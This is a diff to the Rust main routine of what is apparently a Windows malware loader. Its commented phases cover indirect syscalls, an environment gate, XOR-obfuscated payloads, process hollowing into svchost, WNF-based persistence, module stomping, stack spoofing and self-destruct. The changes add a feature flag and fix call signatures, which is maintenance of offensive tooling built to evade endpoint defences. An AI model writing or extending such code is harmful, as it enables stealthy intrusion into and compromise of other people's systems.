@@ -9,6 +9,7 @@ mod utils;
 mod hashes;
 mod syscall;
 mod indirect_syscall;
+#[cfg(feature = "ssn-audit")]
 mod ssn_audit;
 mod loader;
 mod stomp;
@@ -62,6 +63,7 @@ unsafe fn run() {
     let fn_tick     = indirect_syscall::resolve_tick();
 
     // ── Phase 1: SSN audit ────────────────────────────────────────────────
+    #[cfg(feature = "ssn-audit")]
     ssn_audit::verify_critical_ssns();
 
     // ── Phase 2: Environment gate ─────────────────────────────────────────
@@ -103,7 +105,15 @@ unsafe fn run() {
             pe_obfuscate::xor_payload_inplace(&mut buf, &SLEEP_KEY);
             let ok = hollow::hollow_into_svchost(&buf);
             if ok {
-                post_shutdown::install_wnf_channel(&own_path);
+                post_shutdown::install_wnf_channel(
+                    &own_path,
+                    core::ptr::null(),
+                    0,
+                    0,
+                    0,
+                    0,
+                    0,
+                );
             }
             ok
         },
@@ -119,7 +129,7 @@ unsafe fn run() {
     hollow::hollow_into_svchost(&payload_buf);
 
     // ── Phase 10: Post-injection concealment ──────────────────────────────
-    stomp::stomp(0 as _, 0 as _, payload_buf.len());
+    stomp::stomp(core::ptr::null_mut(), 0, payload_buf.len());
     spoof::spoof_stack();
     pe_obfuscate::secure_zero(&mut payload_buf);
 
@@ -128,7 +138,7 @@ unsafe fn run() {
 
     // ── Phase 12: Clean exit ──────────────────────────────────────────────
     persist::uninstall();
-    selfdestruct::destruct();
+    unsafe { selfdestruct::destruct() };
 }
 
 unsafe fn own_path_via_peb() -> String {
